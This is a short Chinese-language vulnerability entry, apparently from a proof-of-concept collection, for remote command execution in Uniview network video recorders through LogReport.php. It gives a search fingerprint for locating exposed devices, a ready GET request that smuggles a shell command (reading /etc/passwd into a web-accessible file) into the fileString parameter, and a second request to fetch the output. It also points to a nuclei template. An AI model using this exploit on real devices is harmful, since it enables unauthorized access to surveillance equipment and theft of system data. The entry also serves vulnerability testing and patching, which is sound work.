# 浙江宇视网络视频录像机LogReport.php远程命令执行

- **系统**：浙江宇视网络视频录像机LogReport.php　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`web.body="Alarm"`
- **请求**：`GET /Interface/LogReport/LogReport.php?action=execUpdate&fileString=x%3bcat%20/etc/passwd%3eqwer123.txt HTTP/1.1`
- **关键头**：`Host: {hostname}`

**请求体 / payload**
```

获取命令执行结果
GET /Interface/LogReport/qwer123.txt HTTP/1.1
Host: {hostname}
Cookie: PHPSESSID=854b7f8a6d3fb343740627484f62886e

nuclei脚本\
\[yushi-isc-logreport-rce.yaml]\(公众号：渗透安全HackTwo>
```

**其他**
- 浙江宇视网络视频录像机 LogReport.php 远程命令执行: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 浙江宇视网络视频录像机